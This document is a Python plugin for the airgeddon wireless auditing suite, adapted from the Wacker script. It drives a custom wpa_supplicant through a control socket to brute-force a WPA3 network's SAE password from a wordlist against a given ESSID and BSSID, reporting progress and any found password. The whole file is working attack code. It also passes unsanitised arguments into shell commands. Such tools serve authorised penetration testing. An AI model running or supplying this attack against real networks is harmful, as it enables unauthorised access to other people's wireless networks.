#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# This plugin is an adaptation of the Wacker script to create an airgeddon plugin.
# Credits to the authors: https://github.com/blunderbuss-wctf/wacker

import os
import sys
import subprocess
import time
import stat
import socket
import signal


class airgeddon_wacker(object):
	RETRY = 0
	SUCCESS = 1
	FAILURE = 2
	EXIT = 3

	def __init__(self):
		self.arr = {}
		self.wordlist = sys.argv[1]
		self.essid = sys.argv[2]
		self.bssid = sys.argv[3]
		self.interface = sys.argv[4]
		self.freq = sys.argv[5]
		self.binary = sys.argv[6]
		self.tmpdir = sys.argv[7]
		self.language = sys.argv[8]

		self.dir = f'{self.tmpdir}'
		self.server = f'{self.dir}/{self.interface}'
		self.conf = f'{self.server}.conf'
		self.log = f'{self.server}.log'
		self.pid = f'{self.server}.pid'
		self.me = f'{self.dir}/{self.interface}_client'
		self.key_mgmt = 'SAE'
		self.sock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
		self.cmd = f'{self.binary} -P {self.pid} -B -i {self.interface} -c {self.conf}'
		self.cmd = self.cmd.split()
		wpa_conf = 'ctrl_interface={}\n\nnetwork={{\n}}'.format(self.dir)
		self.total_count = int(subprocess.check_output(f'wc -l {self.wordlist}', shell=True).split()[0].decode('utf-8'))

		os.system(f'touch {self.dir}/{self.conf} 2> /dev/null')
		os.system(f'touch {self.dir}/{self.interface} 2> /dev/null')
		with open(self.conf, 'w') as f:
			f.write(wpa_conf)

		self.language_strings()
		self.start_supplicant()
		self.create_uds_endpoints()
		self.one_time_setup()

		self.rolling = [0] * 150
		self.start_time = time.time()
		self.lapse = self.start_time
		print('Start time: {}'.format(time.strftime('%d %b %Y %H:%M:%S', time.localtime(self.start_time))))
		print()

	def language_strings(self):
		self.arr = {
			("ENGLISH", 1): "Press [Enter] key to continue...",
			("SPANISH", 1): "Pulsa la tecla [Enter] para continuar...",
			("FRENCH", 1): "Pressez [Enter] pour continuer...",
			("CATALAN", 1): "Prem la tecla [Enter] per continuar...",
			("PORTUGUESE", 1): "Pressione a tecla [Enter] para continuar...",
			("RUSSIAN", 1): "Нажмите клавишу [Enter] для продолжения...",
			("GREEK", 1): "Πατήστε το κουμπί [Enter] για να συνεχίσετε...",
			("ITALIAN", 1): "Premere il tasto [Enter] per continuare...",
			("POLISH", 1): "Naciśnij klawisz [Enter] aby kontynuować...",
			("GERMAN", 1): "Drücken Sie die [Enter]-Taste, um fortzufahren...",
			("TURKISH", 1): "Devam etmek için [Enter] tuşlayınız...",
			("ARABIC", 1): "...للاستمرار [Enter] اضغط على مفتاح",

			("ENGLISH", 2): "Starting custom wpa_supplicant...",
			("SPANISH", 2): "Arrancando wpa_supplicant personalizado...",
			("FRENCH", 2): "Démarrage de wpa_supplicant personnalisé...",
			("CATALAN", 2): "Arrancant wpa_supplicant personalitzat...",
			("PORTUGUESE", 2): "Iniciando versão personalizada do wpa_supplicant...",
			("RUSSIAN", 2): "Запуск пользовательского wpa_supplicant...",
			("GREEK", 2): "Έναρξη προσαρμοσμένου wpa_supplicant...",
			("ITALIAN", 2): "Avviando wpa_supplicant personalizzato...",
			("POLISH", 2): "Uruchamianie niestandardowego wpa_supplicant...",
			("GERMAN", 2): "Benutzerdefiniertes wpa_supplicant starten...",
			("TURKISH", 2): "Özel wpa_supplicant başlatılıyor...",
			("ARABIC", 2): "...جارٍ بدء wpa_supplicant المخصص",

			("ENGLISH", 3): "Custom wpa_supplicant error",
			("SPANISH", 3): "Error de wpa_supplicant personalizado",
			("FRENCH", 3): "Erreur de wpa_supplicant personnalisée",
			("CATALAN", 3): "Error de wpa_supplicant personalitzat",
			("PORTUGUESE", 3): "Erro na versão personalizada do wpa_supplicant",
			("RUSSIAN", 3): "Ошибка пользовательского wpa_supplicant",
			("GREEK", 3): "Σφάλμα προσαρμοσμένου wpa_supplicant",
			("ITALIAN", 3): "Errore wpa_supplicant personalizzato",
			("POLISH", 3): "Błąd niestandardowego wpa_supplicant",
			("GERMAN", 3): "Benutzerdefinierter wpa_supplicant-Fehler",
			("TURKISH", 3): "Özel wpa_supplicant hatası",
			("ARABIC", 3): "خطأ wpa_supplicant المخصص",

			("ENGLISH", 4): "Trying key: ",
			("SPANISH", 4): "Probando contraseña: ",
			("FRENCH", 4): "Essayant mot de passe: ",
			("CATALAN", 4): "Provant contrasenya: ",
			("PORTUGUESE", 4): "Testando senha: ",
			("RUSSIAN", 4): "Пробуем ключ: ",
			("GREEK", 4): "Δοκιμή κωδικού πρόσβασης: ",
			("ITALIAN", 4): "Provando la password: ",
			("POLISH", 4): "Testowane hasło: ",
			("GERMAN", 4): "Passwort testen: ",
			("TURKISH", 4): "Test şifresi: ",
			("ARABIC", 4): "اختبار كلمة المرور: ",

			("ENGLISH", 5): "Launching attack over WPA3 network",
			("SPANISH", 5): "Lanzando ataque contra red WPA3",
			("FRENCH", 5): "Lancent une attaque contre le réseau WPA3",
			("CATALAN", 5): "Llançant atac contra xarxa WPA3",
			("PORTUGUESE", 5): "Iniciando ataque contra a rede WPA3",
			("RUSSIAN", 5): "Запуск атаки на WPA3 сеть",
			("GREEK", 5): "Εκκίνηση επίθεσης κατά του δικτύου WPA3",
			("ITALIAN", 5): "Lanciando l'attacco contro la rete WPA3",
			("POLISH", 5): "Rozpoczęcie ataku na sieć WPA3",
			("GERMAN", 5): "Angriff gegen WPA3-Netzwerk starten",
			("TURKISH", 5): "WPA3 ağına karşı saldırı başlatılıyor",
			("ARABIC", 5): "شن هجوم على شبكة WPA3",

			("ENGLISH", 6): "Password found: ",
			("SPANISH", 6): "Contraseña encontrada: ",
			("FRENCH", 6): "Mot de passe trouvé: ",
			("CATALAN", 6): "Contrasenya trobada: ",
			("PORTUGUESE", 6): "Senha encontrada: ",
			("RUSSIAN", 6): "Пароль найден: ",
			("GREEK", 6): "Ο κωδικός πρόσβασης βρέθηκε: ",
			("ITALIAN", 6): "Password trovata: ",
			("POLISH", 6): "Znalezione hasło: ",
			("GERMAN", 6): "Passwort gefunden: ",
			("TURKISH", 6): "Şifre bulundu: ",
			("ARABIC", 6): "تم العثور على كلمة المرور: ",

			("ENGLISH", 7): "Dictionary finished. Password not found",
			("SPANISH", 7): "Diccionario terminado. Contraseña no encontrada",
			("FRENCH", 7): "Dictionnaire terminé. Mot de passe pas trouvé",
			("CATALAN", 7): "Diccionari acabat. Contrasenya no trobada",
			("PORTUGUESE", 7): "Dicionário finalizado. Senha não encontrada",
			("RUSSIAN", 7): "Словарь завершён. Пароль не найден",
			("GREEK", 7): "Το λεξικό εξαντλήθηκε. Ο κωδικός πρόσβασης δεν βρέθηκε",
			("ITALIAN", 7): "Dizionario finito. Password non trovata",
			("POLISH", 7): "Słownik wyczerpany. Nie znaleziono hasła",
			("GERMAN", 7): "Fertiges Wörterbuch. Passwort nicht gefunden",
			("TURKISH", 7): "Bitmiş sözlük. şifre bulunamadı",
			("ARABIC", 7): "القاموس انتهى. كلمة المرور لم يتم العثور عليها",

			("ENGLISH", 8): "Write down the found password. The window will be closed after pressing the key",
			("SPANISH", 8): "Anota la contraseña encontrada. La ventana se cerrará tras pulsar la tecla",
			("FRENCH", 8): "Notez le mot de passe trouvé. La fenêtre se fermera après avoir appuyé sur la touche",
			("CATALAN", 8): "Anota la contrasenya trobada. La finestra es tancarà després de prémer la tecla",
			("PORTUGUESE", 8): "Anote a senha encontrada. A janela fechará após pressionar a tecla",
			("RUSSIAN", 8): "Запишите найденный пароль. Окно закроется после нажатия клавиши",
			("GREEK", 8): "Σημειώστε τον κωδικό πρόσβασης που βρέθηκε. Το παράθυρο θα κλείσει αφού πατήσετε το πλήκτρο",
			("ITALIAN", 8): "Appunta la password trovata. La finestra si chiuderà dopo aver premuto il tasto",
			("POLISH", 8): "Zapisz znalezione hasło. Okno zamknie się po naciśnięciu klawisza",
			("GERMAN", 8): "Notieren Sie das gefundene Passwort. Das Fenster schließt sich nach Drücken der Taste",
			("TURKISH", 8): "Bulunan şifreyi yazın. tuşuna bastıktan sonra pencere kapanacak",
			("ARABIC", 8): "اكتب كلمة المرور التي تم العثور عليها. ستغلق النافذة بعد الضغط على المفتاح",

			("ENGLISH", 9): "Unexpected error. Try to launch the attack",
			("SPANISH", 9): "Error inesperado. Intenta lanzar el ataque de nuevo",
			("FRENCH", 9): "Erreur inattendue. Essayez de relancer l'attaque",
			("CATALAN", 9): "Error inesperat. Intenta tornar a llançar l'atac",
			("PORTUGUESE", 9): "Erro inesperado. Tente iniciar o ataque novamente",
			("RUSSIAN", 9): "Неожиданная ошибка. Попробуйте еще раз",
			("GREEK", 9): "Απρόσμενο σφάλμα. Προσπαθήστε να ξεκινήσετε ξανά την επίθεση",
			("ITALIAN", 9): "Errore inaspettato. Prova a lanciare di nuovo l'attacco",
			("POLISH", 9): "Niespodziewany błąd. Spróbuj ponownie przeprowadzić atak",
			("GERMAN", 9): "Unerwarteter Fehler. Versuchen Sie, den Angriff erneut zu starten",
			("TURKISH", 9): "Beklenmeyen hata. Saldırıyı tekrar başlatmayı deneyin",
			("ARABIC", 9): "خطأ غير متوقع. حاول شن الهجوم مرة أخرى",
		}

	def create_uds_endpoints(self):
		try:
			os.unlink(self.me)
		except Exception:
			if os.path.exists(self.me):
				raise

		self.sock.bind(self.me)

		print()
		print(self.arr[(self.language, 5)])
		print()

		try:
			self.sock.connect(self.server)
		except Exception:
			raise

	def start_supplicant(self):
		print()
		print(self.arr[(self.language, 2)])
		print()

		subprocess.Popen(self.cmd)
		time.sleep(2)

		mode = os.stat(self.server).st_mode
		if not stat.S_ISSOCK(mode):
			raise Exception(self.arr[(self.language, 3)])

	def send_to_server(self, msg):
		self.sock.sendall(msg.encode())
		d = self.sock.recv(1024).decode().rstrip('\n')
		if d == "FAIL":
			raise Exception(self.arr[(self.language, 3)])
		return d

	def one_time_setup(self):
		self.send_to_server('ATTACH')
		self.send_to_server(f'SET_NETWORK 0 ssid "{self.essid}"')
		self.send_to_server(f'SET_NETWORK 0 key_mgmt {self.key_mgmt}')
		self.send_to_server(f'SET_NETWORK 0 bssid {self.bssid}')
		self.send_to_server(f'SET_NETWORK 0 scan_freq {self.freq}')
		self.send_to_server(f'SET_NETWORK 0 freq_list {self.freq}')
		self.send_to_server(f'SET_NETWORK 0 ieee80211w 1')
		self.send_to_server(f'DISABLE_NETWORK 0')

	def send_connection_attempt(self, psk):
		print(self.arr[(self.language, 4)] + psk)
		self.send_to_server(f'SET_NETWORK 0 sae_password "{psk}"')
		self.send_to_server(f'ENABLE_NETWORK 0')

	def listen(self, count):
		while True:
			datagram = self.sock.recv(2048)
			if not datagram:
				return airgeddon_wacker.RETRY

			data = datagram.decode().rstrip('\n')
			event = data.split()[0]
			if event == "<3>CTRL-EVENT-BRUTE-FAILURE":
				self.print_stats(count)
				self.send_to_server(f'DISABLE_NETWORK 0')
				print('BRUTE ATTEMPT FAIL')
				print()
				return airgeddon_wacker.FAILURE
			elif event == "<3>CTRL-EVENT-NETWORK-NOT-FOUND":
				self.send_to_server(f'DISABLE_NETWORK 0')
				print('NETWORK NOT FOUND')
				return airgeddon_wacker.EXIT
			elif event == "<3>CTRL-EVENT-SCAN-FAILED":
				self.send_to_server(f'DISABLE_NETWORK 0')
				print('SCAN FAILURE')
				return airgeddon_wacker.EXIT
			elif event == "<3>CTRL-EVENT-BRUTE-SUCCESS":
				self.print_stats(count)
				print('BRUTE ATTEMPT SUCCESS')
				print()
				return airgeddon_wacker.SUCCESS
			elif event == "<3>CTRL-EVENT-BRUTE-RETRY":
				print('BRUTE ATTEMPT RETRY')
				print()
				self.send_to_server(f'DISABLE_NETWORK 0')
				return airgeddon_wacker.RETRY

	def print_stats(self, count):
		current = time.time()
		avg = 1 / (current - self.lapse)
		self.lapse = current

		if count <= 150:
			self.rolling[count - 1] = avg
			avg = sum(self.rolling[:count]) / count
		else:
			self.rolling[(count - 1) % 150] = avg
			avg = sum(self.rolling) / 150

		spot = count
		est = (self.total_count - spot) / avg
		percent = spot / self.total_count * 100
		end = time.strftime('%d %b %Y %H:%M:%S', time.localtime(current + est))
		lapse = current - self.start_time
		print(f'{spot:8} / {self.total_count:<8} words ({percent:2.2f}%) : {avg:4.0f} words/sec : ')
		print(f'{lapse / 3600:5.3f} hours lapsed : {est / 3600:8.2f} hours to exhaust ({end})', end='\r')

	def kill(self):
		print()
		print('Stop time: {}'.format(time.strftime('%d %b %Y %H:%M:%S', time.localtime(time.time()))))
		print()
		os.kill(int(open(self.pid).read()), signal.SIGKILL)

	def attempt(self, word, count):
		while True:
			self.send_connection_attempt(word)
			result = self.listen(count)
			if result == self.EXIT:
				self.kill()
				print(self.arr[(self.language, 9)])
				input()
				exit(1)
			elif result != self.RETRY:
				return result

	@staticmethod
	def main(self):
		count = 1
		with open(self.wordlist, "r") as f:
			while True:
				word = f.readline()
				if word:
					word = word.rstrip('\n')
					result = self.attempt(word, count)
					if result == airgeddon_wacker.SUCCESS:
						print(self.arr[(self.language, 6)] + word)
						break
					count += 1
				else:
					print(self.arr[(self.language, 7)])
					break

		self.kill()
		print(self.arr[(self.language, 8)])
		print()
		print(self.arr[(self.language, 1)])
		input()
		exit(0)


if __name__ == '__main__':
	wpa3_attack = airgeddon_wacker()
	wpa3_attack.main(wpa3_attack)
